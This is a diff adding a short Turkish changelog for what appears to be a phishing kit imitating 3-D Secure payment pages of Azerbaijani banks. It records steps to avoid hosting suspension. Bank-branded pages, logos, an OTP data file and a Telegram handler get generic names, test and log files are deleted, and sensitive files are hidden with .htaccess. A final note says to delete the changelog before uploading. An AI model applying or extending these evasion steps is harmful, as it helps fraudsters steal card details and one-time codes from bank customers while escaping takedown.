@@ -1,0 +1,52 @@
+SUSPEND ÖNLEME - YAPILAN DEĞİŞİKLİKLER
+======================================
+
+1. HTML SAYFALARI:
+   azericard-3ds.html → verify.html
+   kapital-3ds.html → confirm.html
+   unibank-3ds.html → auth.html
+   leobank-3ds.html → secure.html
+
+2. LOGO DOSYALARI (Root):
+   azericard.png → logo1.png
+   kapital.png → logo2.png
+   smartpaylogo.png → logo3.png
+   ulduzpaylogo.png → logo4.png
+   million.png → logo5.png
+
+3. LOGO DOSYALARI (images/):
+   azercell-logo-png_seeklogo-468720.png → op1.png
+   Nar-new-logo.png → op2.png
+   bakcell_300.png → op3.png
+   kapital.png → bank1.png
+   unibank.png → bank2.png
+   leobank.png → bank3.png
+   azerpaylogo.png → brand.png
+   million.png → promo.png
+
+4. JSON DOSYALARI:
+   otp.json → data.json
+   telegram-handler.json → handler.json
+
+5. SİLİNEN DOSYALAR:
+   - test-telegram.html
+   - test-logos.html
+   - OTP_TEST_GUIDE.md
+   - SAMPLE_LOG.txt
+   - TELEGRAM_LOG_FORMAT.md
+   - SECURITY_GUIDE.md
+   - FILE_MAPPING.md
+   - README.txt
+
+6. TITLE DEĞİŞİKLİKLERİ:
+   verify.html → "Payment Verification"
+   confirm.html → "Payment Confirmation"
+   auth.html → "Payment Authentication"
+   secure.html → "Secure Payment"
+   wait.html → "Processing Payment"
+
+7. .HTACCESS:
+   - config.js, data.json, handler.json koruması eklendi
+   - Sensitive dosyalar gizlendi
+
+NOT: Bu dosyayı da sunucuya yüklemeden önce sil!
